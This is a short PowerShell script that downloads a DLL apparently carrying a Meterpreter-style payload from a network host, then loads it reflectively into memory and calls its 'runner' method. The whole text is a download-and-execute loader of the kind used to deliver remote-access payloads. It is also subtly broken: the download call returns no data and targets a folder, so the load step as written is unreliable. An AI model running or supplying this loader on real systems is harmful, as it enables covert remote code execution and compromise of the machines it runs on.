$WebClient = New-Object System.Net.WebClient
$data = $WebClient.DownloadFile("http://192.168.0.103:80/xor_met.dll","C:/Downloads")

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
